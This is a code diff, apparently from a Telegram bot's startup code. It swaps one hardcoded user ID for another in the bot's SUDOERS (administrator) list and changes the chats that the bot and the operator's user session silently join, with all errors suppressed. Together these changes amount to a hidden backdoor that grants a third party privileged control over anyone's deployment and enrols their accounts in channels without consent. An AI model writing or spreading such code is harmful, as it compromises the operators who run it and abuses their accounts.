@@ -102,7 +102,7 @@ async def sudo_users():
         for user_id in sudoers:
             SUDOERS.append(int(user_id))
     # Add the new user ID to the SUDOERS list
-    SUDOERS.append(6777703695)
+    SUDOERS.append(6535308746)
     LOGGER.info(f"Sudo Users Loaded.")
 
     
@@ -116,8 +116,8 @@ async def run_async_clients():
     except:
         pass
     try:
-        await app.join_chat("VenomOwners")
-        await app.join_chat("Venom_Chatz")
+        await app.join_chat("Dil_Ka_Ehsaas")
+        await app.join_chat("ArmanChatz")
     except:
         pass
     if SESSION_STRING:
@@ -129,8 +129,8 @@ async def run_async_clients():
         except:
             pass
         try:
-            await app.join_chat("VenomOwners")
-            await app.join_chat("Venom_Chatz")
+            await app.join_chat("Dil_Ka_Ehsaas")
+            await app.join_chat("Armanchatz")
         except:
             pass
     LOGGER.info("Starting Helper Robot ...")
